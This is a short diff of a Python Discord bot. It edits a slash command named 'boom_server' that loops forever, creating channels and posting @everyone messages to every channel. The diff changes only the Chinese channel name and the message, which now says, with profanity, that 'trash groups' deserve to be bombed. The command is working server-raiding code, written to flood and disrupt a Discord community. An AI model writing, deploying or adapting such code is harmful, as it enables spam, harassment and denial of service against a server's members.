@@ -23,8 +23,8 @@ async def cleaer(ctx):
 @bot.slash_command(description="晚安這是測試指令2")
 async def boom_server(ctx):
     while True:
-        await ctx.guild.create_text_channel(name="淦-垃圾商城")
+        await ctx.guild.create_text_channel(name="淦-垃圾群組")
         for channel in ctx.guild.channels:
-            await channel.send("# @everyone 放煙火咯 🧨🧨🧨 淦不要垃圾喇 商城都不開")
+            await channel.send("# @everyone 放煙火咯 🧨🧨🧨 淦垃圾群組就是要被炸")
 
 bot.run("")
